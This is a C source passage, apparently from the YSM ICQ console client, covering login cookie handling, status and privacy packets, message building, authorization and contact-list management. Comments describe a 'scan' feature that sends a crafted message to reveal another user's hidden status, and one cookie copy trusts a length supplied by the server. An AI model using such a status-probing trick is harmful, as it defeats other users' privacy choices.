            YSM_USER.network.cookie_port = (unsigned short)strtol(a, NULL, 10);
            /** update the logging in status bar */
            PRINTF(VERBOSE_BASE, "**");
            break;

        case 0x6:    /* Cookie is here..hmmm ..comida ;) */
            cookie = &buf[x];
            break;

        case 0xC:
            YSM_ERROR(ERROR_NETWORK, 1);
            break;
        case 0x8:
        case 0x4:
            PRINTF(VERBOSE_MOATA,
                "\n%s\n",MSG_ERR_DISCONNECTED);
        default:
            PRINTF(VERBOSE_BASE,
                "Invalid TLV arrived for cookie, quiting.\n");
            YSM_ERROR(ERROR_CRITICAL, 1);
            break;
        }

        x += len;

    }

    close(YSM_USER.network.rSocket);

    YSM_USER.network.rSocket = YSM_Connect(
                YSM_USER.network.cookie_host,
                YSM_USER.network.cookie_port,
                0x1 );

    if (YSM_USER.network.rSocket < 0)
        YSM_ERROR(ERROR_NETWORK, 1);

    /* Generemos nuestro Seq random primario */
    srand((unsigned int)time(NULL));
    g_sinfo.seqnum = rand () % 0xffff;

    /* buf should contain de cookie by now */
    YSM_Init_LoginC(thetlv, cookie);

    g_sinfo.flags |= FL_LOGGEDIN;
    g_promptstatus.flags |= FL_RAW;

    /* update the logging in status bar */
    PRINTF(VERBOSE_BASE, "**]");
    PRINTF(VERBOSE_BASE, "\n%s\n\n", MSG_LOGIN_OK);
}

void YSM_Init_LoginC(TLV thetlv, char *buff)
{
    FLAP_Head  head;
    char       buf[4];
    char      *paquete = NULL;
    int        paqsize, newseq, tsize = 0;

    if (buff == NULL)
        return;

    memset(&head,'\0',sizeof(head));
    memset(buf,'\0',4);

    recv(YSM_USER.network.rSocket,(char *)&head,sizeof(head),0);
    recv(YSM_USER.network.rSocket,&buf[0],4,0);

    /* aca tambien el server nos manda el 0001 */
    if (!buf[0] && !buf[1] && !buf[2] && buf[3] == 1)
    {
        /* mandamos un solo TLV con la cookie */
        paqsize = sizeof(TLV) + 257;
        paqsize += sizeof(FLAP_Head) + 4;

        paquete = ysm_calloc(1, paqsize, __FILE__ , __LINE__);

        /* We Leave space for the Flap Head */
        tsize += sizeof(FLAP_Head);

        /* We copy the 0001 as reply  */
        memcpy(paquete+tsize,&buf,4);
        tsize += 4;

        /* TLV type 6 THE COOKIE! */
        /* (we alrady have the tlv from InitB) =) */
        memcpy(paquete+tsize,&thetlv,sizeof(TLV));
        tsize += sizeof(TLV);
        /* data of tlv...the cookie! =) */

        memcpy(paquete+tsize,buff,Chars_2_Wordb(thetlv.len));
        tsize += Chars_2_Wordb(thetlv.len);

        /* Flap HEAD -- Replace the first sizeof(FLAP_Head) bytes */
        /* with the new Flap HEADER. */

        newseq = Chars_2_Wordb(head.seq);
        newseq++;
        Word_2_Charsb(head.seq,newseq);

        /* Data Len means without the header file! */
        Word_2_Charsb(head.dlen,tsize-sizeof(FLAP_Head));
        memcpy(paquete,&head,sizeof(FLAP_Head));

        /* Cruzar dedos y mandar el paquete de Login -B (la cookie)- */
        YSM_WRITE(YSM_USER.network.rSocket,paquete,tsize);

        ysm_free(paquete, __FILE__, __LINE__);
        paquete = NULL;
    }
    else
    {
        PRINTF(VERBOSE_MOATA,
        "\nWeird, When we were going to send the cookie, we didnt receive\n");
        PRINTF(VERBOSE_MOATA,
        "the 0001 from the server. So its an error, and we are quitting..\n");
        YSM_ERROR(ERROR_CRITICAL, 1);
    }

    /* update the logging in status bar */
    PRINTF(VERBOSE_BASE, "**");
}


/*
YSM_UpdatePrivacy possible settings are:

0x1 : Allow all users to see you.
0x2 : Block all users from seeing you. (Even the visible)
0x3 : Block all users but the Visible list from seeing you.
0x4 : Block users on your deny list.
0x5 : Only allow users in your buddy list.
*/

void YSM_UpdatePrivacy(int Setting)
{
    int    dlen = 0, tsize = 0;
    char  *data, item_type[2];
    char   YSMBuddy_ID[2];
    char   reqid[4];

    /* We increment the change count on our buddy list for future chgs */
    g_sinfo.blentries++;

    /* Just used if adding a Buddy */
    Word_2_Charsb(YSMBuddy_ID, g_sinfo.blprivacygroupid);

    dlen = 2;    /* Len (WORD) */
    dlen += 2 + 2; /* Group ID and Buddy ID */
    dlen += 2;    /* Type 0004 is changing Security Preferences */
    dlen += 2;    /* Extra len (WORD) */
    dlen += sizeof(TLV);    /* the 0xca TLV */
    dlen ++;    /* The Setting */

    data = ysm_calloc(1, dlen, __FILE__, __LINE__);

    tsize = 0;
    tsize += 2;    /* len == 0 */
    tsize += 2;    /* GrpID == 0, Master Group! */

    memcpy(data+tsize,YSMBuddy_ID,2);
    tsize += 2;

    Word_2_Charsb(item_type,0x0004);
    memcpy(data+tsize,&item_type,2);    /* Type == 0x0004 */
    tsize += 2;

    /* Len is a fixed size (sizeof(TLV) == 4, + Flag == 1 )    */
    Word_2_Charsb(item_type,0x0005); /* Len, reusing the variable */
    memcpy(data+tsize,&item_type,2);    /* Xtra len */
    tsize += 2;

    memset(reqid,0,4);
    reqid[1] = g_sinfo.blentries;
    reqid[3] = 0x09;

    /* Now insert the Setting in its TLV 0xca */
    InsertTLV(&Setting, 0xca, data+tsize, 1);

    YSM_SendSNAC(0x13, 0x09, 0x0, 0x0,
        data,
        dlen,
        g_sinfo.seqnum++, reqid);

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;
}

int32_t YSM_ChangeStatus(u_int16_t status)
{
    TLV        thetlv;
    u_int32_t  len = 0, pos = 0;
    int8_t    *buf = NULL;

    /* autoaway is always overriden when calling ChangeStatus.
     * hence, autoaway MUST be set AFTER the call for away status change.
     */

    g_promptstatus.flags &= ~FL_AUTOAWAY;

    len = sizeof(TLV) + 4;        /* tlv 0x6 (status) */
    len += sizeof(TLV) + 2;        /* tlv 0x8 (?) */
    len += sizeof(TLV) + 0x25;    /* tlv 0x0c */

    buf = ysm_calloc(1, len, __FILE__, __LINE__);

    /* TLV 0x6 */
    Word_2_Charsb(thetlv.type, 0x6);
    Word_2_Charsb(thetlv.len, 0x4);
    memcpy(&buf[pos], &thetlv, sizeof(TLV));
    pos += sizeof(TLV);

    /* use the status_flags we have when changing status */
    Word_2_Charsb(&buf[pos], YSM_USER.status_flags);
    pos += 2;
    /* and add the new status to the packet */
    Word_2_Charsb(&buf[pos], status);
    pos += 2;

    /* TLV 0x8 */
    Word_2_Charsb(thetlv.type,0x8);
    Word_2_Charsb(thetlv.len,0x2);
    memcpy(&buf[pos],&thetlv,sizeof(TLV));
    pos += sizeof(TLV);
    pos += 2;    /* Data is 0x0000 */

    /* TLV 0xC  - Direct Connections - */
    Word_2_Charsb(thetlv.type,0x0c);
    Word_2_Charsb(thetlv.len,0x25);

    memcpy(&buf[pos],&thetlv,sizeof(TLV));
    pos += sizeof(TLV);

    if (!g_cfg.dcdisable)
        memcpy(&buf[pos],&YSM_USER.d_con.rIP_int, 4);

    pos += 4;        /* IP Address    */
    pos += 2;        /* Our Port, its a DWORD thats why */

    if (!g_cfg.dcdisable)
        memcpy(&buf[pos],&YSM_USER.d_con.rPort, 2);

    pos += 2;        /* Our Port    */

    buf[pos] = 0x04;    /* DC flag  */

    /* 0x01 for FW, 0x04 for */
    pos++;

    pos++;

    buf[pos] = YSM_PROTOCOL_VERSION;
    pos++;

    pos += 4;    /* Connection Cookie */
    /* TODO: This could be important, if we set a cookie    */
    /* here, maybe its the cookie required by any client    */
    /* to connect to us. So we could check if the client    */
    /* connecting to us, ever connected to the icq server    */
    /* (that way, a unique real client)            */

    pos += 2;    /* Empty WORD */

    pos++;
    buf[pos] = 0x50;
    pos++;

    pos += 2;    /* Empty WORD */

    pos++;
    buf[pos] = 0x03;
    pos++;

    /* YSM Fingerprint */
    DW_2_Chars( &buf[pos], FINGERPRINT_YSM_CLIENT );
    pos += 4;

    pos += 4;    /* versioning */

    DW_2_Chars( &buf[pos], FINGERPRINT_YSM_CLIENT_CRYPT );
    pos += 4;

    /* 2 zero bytes */
    pos += 2;

    YSM_SendSNAC(0x1,
        0x1E,
        0x0,
        0x0,
        buf,
        len,
        g_sinfo.seqnum++, NULL);

    if (status == STATUS_INVISIBLE)
    {
        YSM_UpdatePrivacy(0x3);
    }
    else if (YSM_USER.status == STATUS_INVISIBLE)
    {
        /* Were in Invisible and changing to something else
         * we choose 0x4 as default, since it blocks people
         * in the deny list..a common request huh
         */
        YSM_UpdatePrivacy(0x4);
    }

    YSM_USER.status = status;

    ysm_free(buf, __FILE__, __LINE__);

    return status;
}

int32_t YSM_SendMessage2Client(
    slave_t    *victim,
    uin_t       r_uin,
    int16_t     m_format,
    int32_t     m_type,
    int8_t     *m_data,
    int32_t     m_len,
    u_int8_t    m_flags,
    u_int8_t    sendflags,
    int32_t     reqid)
{
    int8_t     *phead = NULL, *pbody = NULL, *pmsg = NULL;
    int32_t     hsize = 0, bsize = 0;
    u_int32_t   m_id = 0, m_time = 0;

    m_time    = rand() % 0xffff;
    m_id    = rand() % 0xffff;

    hsize = YSM_BuildMessageHead(r_uin, m_format, m_time, m_id, &phead);
    if (hsize < 0 || phead == NULL) {
        return -1;
    }

    switch (m_format) {
        case 0x0001:
            bsize = YSM_BuildMessageBodyType1( r_uin,
                            m_data,
                            m_len,
                            &pbody );
            break;

        case 0x0002:
            bsize = YSM_BuildMessageBodyType2( victim,
                            r_uin,
                            m_data,
                            m_len,
                            m_type,
                            m_time,
                            m_id,
                            m_flags,
                            sendflags,
                            &pbody );
            break;

        case 0x0004:
            bsize = YSM_BuildMessageBodyType4( r_uin,
                            m_data,
                            m_len,
                            m_type,
                            m_flags,
                            &pbody );
            break;

        default:
            /* unrecognized message type */
            ysm_free(phead, __FILE__, __LINE__);
            phead = NULL;
            return -1;
    }

    if (bsize < 0 || pbody == NULL) {
        ysm_free(phead, __FILE__, __LINE__);
        phead = NULL;
        return -1;
    }

    /* get space in the heap for hsize+bsize + a last empty TLV. */
    pmsg = ysm_calloc(1, hsize+bsize+sizeof(TLV), __FILE__, __LINE__);
    memcpy(pmsg, phead, hsize);
    memcpy(pmsg+hsize, pbody, bsize);

    /* last empty tlv */
    switch (m_format) {
        case 0x0002:
            /* the scan thingie gets buggy when we send a 3
             * instead of a 6. (as we should). This isn't tidy.
             * scan uses a unique m_flags of 0x19
             */
            if (m_flags == 0x19)
                InsertTLV(0x0, 0x6, pmsg+hsize+bsize, 0x0);
            else
                InsertTLV(0x0, 0x3, pmsg+hsize+bsize, 0x0);
            break;
        default:
            InsertTLV(0x0, 0x6, pmsg+hsize+bsize, 0x0);
            break;
    }

    YSM_SendSNAC(
        YSM_MESSAGING_SNAC,
        YSM_MESSAGE_FROM_CLIENT,
        0x00,
        0x00,
        pmsg,
        hsize+bsize+sizeof(TLV),
        g_sinfo.seqnum++,
        (char *)&reqid
        );

    ysm_free(pmsg, __FILE__, __LINE__);
    ysm_free(phead, __FILE__, __LINE__);
    ysm_free(pbody, __FILE__, __LINE__);

    return 0;
}

int32_t YSM_BuildMessageHead( uin_t    r_uin,
        int16_t        m_format,
        u_int32_t    m_time,
        u_int32_t    m_id,
        int8_t        **phead )
{
int16_t    pos = 0;
int8_t    uinstring[MAX_UIN_LEN];

    if (*phead != NULL)
        return -1;

    memset(uinstring, '\0', sizeof(uinstring));
    snprintf(uinstring, sizeof(uinstring) - 1, "%d", (int)r_uin);
    uinstring[sizeof(uinstring)-1] = 0x00;

    pos += 8;                /* timestamp + id */
    pos += 2;                /* format */
    pos += 1 + strlen(uinstring);        /* remote UIN */

    *phead = ysm_calloc(1, pos, __FILE__, __LINE__);
    pos = 0;

    DW_2_Charsb((*phead)+pos, m_time);    /* mtimestamp */
    pos += 4;
    DW_2_Charsb((*phead)+pos, m_id);    /* mID */
    pos += 4;

    Word_2_Charsb((*phead)+pos, m_format);    /* msg sending type */
    pos += 2;


    *((*phead)+pos) = strlen(uinstring);    /* remote uin string */
    pos++;
    memcpy((*phead)+pos, &uinstring, strlen(uinstring));
    pos += strlen(uinstring);

    return pos;
}

int32_t
YSM_BuildMessageBodyType1( int32_t    r_uin,
        int8_t        *m_data,
        int32_t        m_len,
        int8_t        **pbody )
{
int16_t        pos = 0;
TLV        tlv2, tlv1281, tlv257;

    if (*pbody != NULL)
        return -1;

    memset(&tlv2, 0, sizeof(tlv2));
    memset(&tlv257, 0, sizeof(tlv257));
    memset(&tlv1281, 0, sizeof(tlv1281));

    pos += sizeof(TLV);    /* tlv 2 - encapsulates the whole type1 body */
    pos += sizeof(TLV) + 1;    /* tlv 1281 + tlv data(1 byte) */
    pos += sizeof(TLV);    /* tlv 257 - encapsulates the message */
    pos += 4;        /* unknown tlv data */
    pos += m_len;        /* the message */

    *pbody = ysm_calloc(1, pos, __FILE__, __LINE__);

    Word_2_Charsb(tlv2.type, 2);
    Word_2_Charsb(tlv2.len, pos - sizeof(TLV));

    Word_2_Charsb(tlv1281.type, 1281);
    Word_2_Charsb(tlv1281.len, 0x1);

    Word_2_Charsb(tlv257.type, 257);
    Word_2_Charsb(tlv257.len, 4 + m_len);

    pos = 0;

    memcpy((*pbody)+pos, &tlv2, sizeof(tlv2));
    pos += sizeof(tlv2);
    memcpy((*pbody)+pos, &tlv1281, sizeof(tlv1281));
    pos += sizeof(tlv1281);
    *((*pbody)+pos) = 0x01;
    pos ++;
    memcpy((*pbody)+pos, &tlv257, sizeof(tlv257));
    pos += sizeof(tlv257);
    pos += 4;            /* zeroed */
    memcpy((*pbody)+pos, m_data, m_len);
    pos += m_len;

    return pos;
}

int32_t
YSM_BuildMessageBodyType2( slave_t    *victim,
        uin_t        r_uin,
        int8_t        *m_data,
        int32_t        m_len,
        int32_t        m_type,
        u_int32_t    m_time,
        u_int32_t    m_id,
        u_int8_t    m_flags,
        u_int8_t    sendflags,
        int8_t        **pbody )
{
int8_t        *tlvpack = NULL, m_len2[2];
u_int32_t    tlv5size = 0, bottomsize = 0;
int16_t        pos = 0;

    if (*pbody != NULL)
        return -1;

    /* TLV 5 size (only type 2 messages) */
    tlv5size +=  2;            /* ack type */
    tlv5size +=  8;            /* time + id */

    tlv5size += 16;            /* a capability */
    tlv5size += sizeof(TLV) + 2;    /* tlv(10) - ack type 2 */

    /* skipping 2 tlvs only for file related packets */

    tlv5size += sizeof(TLV);    /* tlv(0x0f) empty */
    tlv5size += sizeof(TLV);    /* tlv 0x2711 - msg TLV */
    tlv5size += 2;            /* length till end of seq1 */
    tlv5size += 2;            /* TCP protocol version */

    tlv5size += 16;            /* empty capability, weird */
    tlv5size += 3;            /* unknown */
    tlv5size += 4;            /* msg global type */
    tlv5size += 2;            /* sequence # */

    tlv5size += 2;            /* unknown */
    tlv5size += 2;            /* sequence again */
    tlv5size += 12;            /* unknown */

    tlv5size += 2;            /* m_type */
    tlv5size += 2;            /* unknown */
    tlv5size += 2;            /* priority */

    tlv5size += 2 + m_len;        /* the message */

    if (sendflags & MFLAGTYPE_NORM) {
        tlv5size += 8;        /* Colors, only in normal msgs */
        bottomsize += 8;
    }

    if (sendflags & MFLAGTYPE_RTF) {
        tlv5size += 4;
        tlv5size += sizeof(CAP_RTF_GUID)-1;    /* RTF GUID */
        bottomsize += 4 + sizeof(CAP_RTF_GUID)-1;

    } else if (sendflags & MFLAGTYPE_UTF8) {
        tlv5size += 4;
        tlv5size += sizeof(CAP_UTF8_GUID)-1;    /* UTF8 GUID */
        bottomsize += 4 + sizeof(CAP_RTF_GUID)-1;
    }

    pos += sizeof(TLV);        /* TLV 5 */
    pos += tlv5size;        /* tlv 5 attached data */

    *pbody = ysm_calloc(1, pos, __FILE__, __LINE__);
    pos = 0;

    /* alloc space for the TLV 5 data */
    tlvpack = ysm_calloc(1, tlv5size, __FILE__, __LINE__);

    pos += 2;            /* ack type 0 - normal msg */

    DW_2_Charsb(tlvpack+pos, m_time);
    pos += 4;            /* copy of head timestamp */
    DW_2_Charsb(tlvpack+pos, m_id);
    pos += 4;            /* copy of head mID */

    /* FIXME: this is aweful. since the scan commands uses a 'specially'
     * crafted message in order to reveal someones real status..and we
     * really dont want to add another parameter nor function for it.
     * we have to code the following aweful comparisons against m_flags
     * being 0x19 (used only in scan requests). sorry :)
     * Oh, btw, the problem is that we cant send capabilities during scan.
     * If m_flags are 0x19, we set them to 0x03 afterwards so it works.
     */

    /* capability -> 16 bytes */
    if (m_flags != 0x19)
        memcpy(&tlvpack[pos], CAP_PRECAP, sizeof(CAP_PRECAP)-1);
    pos += sizeof(CAP_PRECAP)-1;

    if (m_flags != 0x19)
        memcpy(&tlvpack[pos], CAP_SRVRELAY, sizeof(CAP_SRVRELAY)-1);
    pos += sizeof(CAP_SRVRELAY)-1;

    if (m_flags != 0x19)
        memcpy(&tlvpack[pos], CAP_POSCAP, sizeof(CAP_POSCAP)-1);
    pos += sizeof(CAP_POSCAP)-1;

    tlvpack[pos+1] = 0x0A;
    pos += 2;
    tlvpack[pos+1] = 0x02;
    pos += 2;
    tlvpack[pos+1] = 0x01;    /* TLV 0x0A -> Acktype2 */
    pos += 2;

    tlvpack[pos+1] = 0x0F;
    pos += 2;
    pos += 2;                  /* TLV 0x0F -> unknown and empty */

    tlvpack[pos] = 0x27;
    tlvpack[pos+1] = 0x11;
    pos += 2;
    Word_2_Charsb( &tlvpack[pos], 51 + 2 + m_len + bottomsize);
    pos += 2;            /* TLV 0x2711 -> the message */

    tlvpack[pos] = 0x1B;
    pos += 2;            /* length till sequence # */

    tlvpack[pos] = YSM_PROTOCOL_VERSION;
    pos ++;            /* TCP protocol version */

    pos += 16;            /* empty capability */
    tlvpack[pos+3] = 0x03;
    pos += 4;            /* unknown */
    pos += 4;            /* msg global type */
    pos += 2;            /* sequence # */

    tlvpack[pos] = 0x0E;
    pos += 2;            /* unknown length */

    pos += 2;            /* sequence # */
    pos += 12;            /* unknown */

    /*** scan fix, read above ****/
    if (m_flags == 0x19) m_flags = 0x03;

    tlvpack[pos] = m_type;
    tlvpack[pos+1] = m_flags;
    pos += 2;            /* m_type */

    pos += 2;            /* unknown */

    if (victim->status == STATUS_DND)
        tlvpack[pos] = 0x04;
    else
        tlvpack[pos] = 0x21;
    pos += 2;            /* priority */

    Word_2_Chars(m_len2, m_len);
    memcpy( tlvpack + pos, &m_len2, 2 );
    pos += 2;
    memcpy( tlvpack + pos, m_data, m_len );
    pos += m_len;        /* the message */

    /* do we have to insert colors? */
    if (sendflags & MFLAGTYPE_NORM) {
        tlvpack[pos++]    = 0x00;
        tlvpack[pos++]    = 0x00;
        tlvpack[pos++]    = 0x00;
        tlvpack[pos++]    = 0x00;
        tlvpack[pos++]    = (char)0xff;
        tlvpack[pos++]    = (char)0xff;
        tlvpack[pos++]    = (char)0xff;
        tlvpack[pos++]    = 0x00;
    }

    /* do we have to insert a GUID ? */
    if (sendflags & MFLAGTYPE_RTF) {
        DW_2_Chars(tlvpack+pos,sizeof(CAP_RTF_GUID)-1);
        pos += 4;
        memcpy(tlvpack+pos,
            CAP_RTF_GUID,
            sizeof(CAP_RTF_GUID)-1);
        pos += sizeof(CAP_RTF_GUID)-1;

    } else if (sendflags & MFLAGTYPE_UTF8) {
        DW_2_Chars(tlvpack+pos,sizeof(CAP_UTF8_GUID)-1);
        pos += 4;
        memcpy(tlvpack+pos,
            CAP_UTF8_GUID,
            sizeof(CAP_UTF8_GUID)-1);
        pos += sizeof(CAP_UTF8_GUID)-1;
    }

    /* we insert the TLV 5 in the main packet */
    InsertTLV(tlvpack, 0x5, *pbody, tlv5size);
    pos += 4;

    ysm_free(tlvpack, __FILE__, __LINE__);
    tlvpack = NULL;
    return pos;
}

int32_t
YSM_BuildMessageBodyType4( uin_t    r_uin,
        int8_t        *m_data,
        int32_t        m_len,
        int32_t        m_type,
        u_int8_t    m_flags,
        int8_t        **pbody )
{
int16_t        pos = 0;
TLV        tlv5;

    if (*pbody != NULL)
        return -1;

    pos += sizeof(TLV);    /* tlv 5 */
    pos += 4;        /* sender's UIN */
    pos += 2;        /* m_type */
    pos += 2 + m_len + 1;    /* LNTS [word + string + zero] */

    memset(&tlv5, 0, sizeof(tlv5));
    Word_2_Charsb(tlv5.len, pos - sizeof(TLV));
    Word_2_Charsb(tlv5.type, 0x05);

    *pbody = ysm_calloc(1, pos, __FILE__, __LINE__);
    pos = 0;

    memcpy((*pbody)+pos, &tlv5, sizeof(tlv5));
    pos += sizeof(tlv5);
    DW_2_Chars((*pbody)+pos, YSM_USER.Uin);
    pos += 4;
    *((*pbody)+pos)        = m_type;
    *((*pbody)+pos+1)    = m_flags;
    pos += 2;

    /* LNTS */
    Word_2_Chars((*pbody)+pos, m_len);
    pos += 2;
    memcpy((*pbody)+pos, m_data, m_len);
    pos += m_len + 1;

    return pos;
}

void
YSM_ForwardMessage( uin_t r_uin, char *inmsg )
{
int8_t outmsg[MAX_DATA_LEN];

    memset(outmsg, 0, sizeof(outmsg));

    snprintf(outmsg, sizeof(outmsg), "<%d> %s", (int)r_uin, inmsg);
    outmsg[sizeof(outmsg)-1] = 0x00;

    YSM_SendMessage( g_cfg.forward, outmsg, 0, NULL, 1 );
}

void
YSM_SendAuthRequest( uin_t uin, char *Nick, char *Message )
{
int8_t    *paquete = NULL;
int8_t    sUin[MAX_UIN_LEN+1], mlen[2];
int32_t    dlen = 0;

    memset(sUin, '\0', sizeof(sUin));
    snprintf(sUin, MAX_UIN_LEN, "%d", (int)uin);
    sUin[sizeof(sUin)-1] = 0x00;

    if (Message == NULL)
        Message = YSM_DEFAULT_AUTHREQ_MESSAGE;

    dlen = 1;    /* Len of UIN */
    dlen += strlen(sUin);    /* UIN to Request */
    dlen += 2;    /* Len of Message (WORD) */
    dlen += strlen(Message);    /* Request Message */
    dlen += 2;    /* Extra Flags (Usually 0x0000) */

    paquete = ysm_calloc(1, dlen, __FILE__, __LINE__);

    paquete[0] = strlen(sUin);
    memcpy(paquete+1, &sUin, strlen(sUin));

    Word_2_Charsb(mlen, strlen(Message));
    memcpy(paquete+1+strlen(sUin),mlen,2);
    memcpy(paquete+1+strlen(sUin)+2,Message,strlen(Message));

    YSM_SendSNAC(0x13,
            0x18,
            0x0,
            0x0,
            paquete,
            dlen,
            g_sinfo.seqnum++, NULL);

    if (Nick)
        PRINTF(VERBOSE_BASE,
        MSG_REQ_SENT1" "MSG_REQ_SENT2" %s. (%d).\n", Nick, uin);
    else
        PRINTF(VERBOSE_BASE, MSG_REQ_SENT1" %d.\n", uin);

    ysm_free(paquete, __FILE__, __LINE__);
    paquete = NULL;
}


void
YSM_SendAuthOK( uin_t uin, char *Nick )
{
int8_t    *paquete = NULL;
int8_t    ICQStr[MAX_UIN_LEN+1];
int32_t    dlen = 0;

    memset(ICQStr,'\0',sizeof(ICQStr));
    snprintf(ICQStr,MAX_UIN_LEN,"%d", (int)uin);
    ICQStr[sizeof(ICQStr)-1] = 0x00;

    dlen = 1;    /* Len of UIN */
    dlen += strlen(ICQStr);    /* UIN to Request */
    dlen ++;    /* Flag response, 0x01 accept, 0x00 decline */
    dlen += 2;    /* Len of Message (WORD) */
    dlen += 0;    /* decline message, nothing */
    dlen += 2;    /* Extra Flags (Usually 0x0000) */

    paquete = ysm_calloc(1, dlen, __FILE__, __LINE__);

    paquete[0] = strlen(ICQStr);
    memcpy(paquete+1, &ICQStr, strlen(ICQStr));

    /* Accept Auth Req */
    paquete[1+strlen(ICQStr)] = 0x01;

    /* Here should be the message len, but as its 0, leave zeros */
    /* same with message and Flags */
    YSM_SendSNAC( 0x13,
            0x1a,
            0x0,
            0x0,
            paquete,
            dlen,
            g_sinfo.seqnum++,
            NULL);

    if(Nick)
        PRINTF( VERBOSE_BASE,
            MSG_AUTH_SENT1" "MSG_AUTH_SENT2" %s. (%d).\n",
            Nick, uin);
    else
        PRINTF( VERBOSE_BASE, MSG_AUTH_SENT1" %d.\n", uin);

    ysm_free(paquete, __FILE__, __LINE__);
    paquete = NULL;
}

void YSM_SendContacts(void)
{
u_int32_t   x = 0, usize = 0, ulen = 0;
int8_t     *data = NULL, tmp[MAX_UIN_LEN+1];
slave_t    *Firstnode = (slave_t *) g_slave_list.start;


    for (x = 0; x < g_slave_list.length; x++) {
        if (Firstnode != NULL) {
            memset(tmp,'\0',sizeof(tmp));
            snprintf(tmp,sizeof(tmp),"%d", (int)Firstnode->uin);
            tmp[sizeof(tmp)-1] = 0x00;
            usize += strlen(tmp);
            usize++;        /* byte of len too */

            Firstnode = (slave_t *) Firstnode->suc;
        }
    }

    Firstnode = (slave_t *) g_slave_list.start;
    if (usize <= 0) return;

    data = ysm_malloc(usize, __FILE__, __LINE__);

    for (x = 0, usize=0; x < g_slave_list.length; x++) {
        if (Firstnode != NULL) {
            memset(tmp,'\0',sizeof(tmp));
            snprintf(tmp,sizeof(tmp),"%d", (int)Firstnode->uin);
            tmp[sizeof(tmp) - 1] = 0x00;
            ulen = strlen(tmp);
            data[usize] = ulen;
            usize++;
            memcpy(data+usize,&tmp,ulen);
            usize += ulen;

            Firstnode = (slave_t *) Firstnode->suc;
        }
    }

    YSM_SendSNAC(0x3, 0x04, 0x0, 0x0, data, usize, g_sinfo.seqnum++, NULL);
    ysm_free(data, __FILE__, __LINE__);
    data = NULL;
}

void
YSM_RemoveContact( slave_t *contact )
{
int8_t        tmp[MAX_UIN_LEN + 1], *data = NULL;
u_int32_t    dlen = 0, ulen = 0;

    if (contact == NULL)
        return;

    snprintf(tmp, MAX_UIN_LEN,"%d", (int)contact->uin);
    tmp[sizeof(tmp) - 1] = 0x00;

    ulen = strlen(tmp);
    if (ulen > MAX_UIN_LEN)
        return;

    dlen = ulen + 1;    /* length + uin */
    data = ysm_calloc(1, dlen, __FILE__, __LINE__);
    if (data == NULL)
        return;

    memcpy(data, &ulen, 1);
    memcpy(data + 1, &tmp, ulen);

    YSM_SendSNAC( YSM_BUDDY_LIST_SNAC,
            YSM_CLI_REMOVE_BUDDY,
            0x0,
            0x0,
            data,
            dlen,
            g_sinfo.seqnum++,
            NULL);

    /* Now remove from the server too (only if it was stored up there) */
    if (contact->DownloadedFlag)
        YSM_BuddyDelSlave(contact);

    ysm_free(data, __FILE__, __LINE__);
    data = NULL;
}


/* If a buddy is stored in the server, change his/her            */
/* type to our Ignore list so they don't fuck with us no M0re y0!    */

void
YSM_BuddyIgnore( slave_t *buddy, int flag )
{
    if(flag)    /* Add to Ignore list */
    {
        buddy->BudType.IgnoreID = YSM_BuddyAddItem( buddy,
                        YSM_BUDDY_GROUPNAME,
                        0x0,
                        0x0,
                        YSM_BUDDY_SLAVE_IGN,
                         0, 0, 0x08);
    }
    else        /* Remove from the Ignore list */
    {
        YSM_BuddyAddItem( buddy,
                YSM_BUDDY_GROUPNAME,
                0x0,
                buddy->BudType.IgnoreID,
                YSM_BUDDY_SLAVE_IGN,
                 0, 0, 0x0a);

        /* Reset the Ignore Flag */
        buddy->BudType.IgnoreID = 0;
    }

    YSM_BuddyRequestFinished();
}


/* If a buddy is stored in the server, change his/her    */
/* type to our block/invisible list so they wont see us    */

void
YSM_BuddyInvisible( slave_t *buddy, int flag )
{
    if(flag)    /* Add to invisible list */
    {

        buddy->BudType.InvisibleID = YSM_BuddyAddItem(
                            buddy,
                            YSM_BUDDY_GROUPNAME,
                            0x0,
                            0x0,
                            YSM_BUDDY_SLAVE_INV,
                            0, 0, 0x08);
    }
    else        /* Remove from the invisible list */
    {
        YSM_BuddyAddItem( buddy,
                YSM_BUDDY_GROUPNAME,
                0x0,
                buddy->BudType.InvisibleID,
                YSM_BUDDY_SLAVE_INV,
                0, 0, 0x0a);

        /* Reset the Invisible Flag */
        buddy->BudType.InvisibleID = 0;
    }

    YSM_BuddyRequestFinished();
}


/* If a buddy is stored in the server, change his/her    */
/* type to our Allow/Visible list so they see us when we drink     */
/* the magic potion */
void
YSM_BuddyVisible( slave_t *buddy, int flag )
{
    if(flag)    /* Add to the Visible list */
    {
        buddy->BudType.VisibleID = YSM_BuddyAddItem( buddy,
                        YSM_BUDDY_GROUPNAME,
                        0x0,
                        0x0,
                        YSM_BUDDY_SLAVE_VIS,
                        0, 0, 0x08);
    }
    else        /* Remove from the Visible list */
    {
        YSM_BuddyAddItem( buddy,
                YSM_BUDDY_GROUPNAME,
                0x0,
                buddy->BudType.VisibleID,
                YSM_BUDDY_SLAVE_VIS,
                0, 0, 0x0a);

        /* Reset the Visible Flag */
        buddy->BudType.VisibleID = 0;


    }

    YSM_BuddyRequestFinished();
}


static void YSM_BuddyAddSlave( char *nick,
        char    *uin,
        char    *budID,
        char    *grpID,
        char    *type,
        int    fl)
{
    uin_t    uini;
    slave_t *new = NULL;

    uini = atoi(uin);
    if(uini <= 0) return;

    PRINTF(VERBOSE_SDOWNLOAD,"\n[2]-- inside Rost_AddSlave");
    PRINTF(VERBOSE_SDOWNLOAD,"\n[2]-- about to add %s with %d",nick,uini);

    new = YSM_AddSlaveToList( nick,
                uini,
                NULL,
                NULL,
                Chars_2_Wordb(budID),
                Chars_2_Wordb(grpID),
                Chars_2_Wordb(type),
                fl);

    if (new != NULL)
    {
        PRINTF(VERBOSE_SDOWNLOAD,"\n[2]-- done.");
        PRINTF(VERBOSE_SDOWNLOAD,"\n[3]-- Saving slave to disk.");

        YSM_AddSlaveToDisk(new);

        PRINTF(VERBOSE_SDOWNLOAD,"\n[4]-- done.");
    }
}


/* BuddyDelSlave - removes a slave from the server-side contact list.
 */

void
YSM_BuddyDelSlave( slave_t *contact )
{
    if (contact == NULL)
        return;

    PRINTF( VERBOSE_MOATA,
        "\nRemoving from server: %s with budid: %x "
        "and groupd id: %x\n",
        contact->info.NickName,
        contact->BudType.BudID,
        contact->BudType.grpID);

    YSM_BuddyAddItem( contact,
            YSM_BUDDY_GROUPNAME,
            contact->BudType.grpID,
            contact->BudType.BudID,
            YSM_BUDDY_SLAVE,
            0,            /* cmd */
            0,            /* auth */
            0x0a);            /* remove! */
}

void
YSM_BuddyRequestModify(void)
{
char reqid[4];

        memset(reqid,0,4);
        reqid[3] = 0x11;

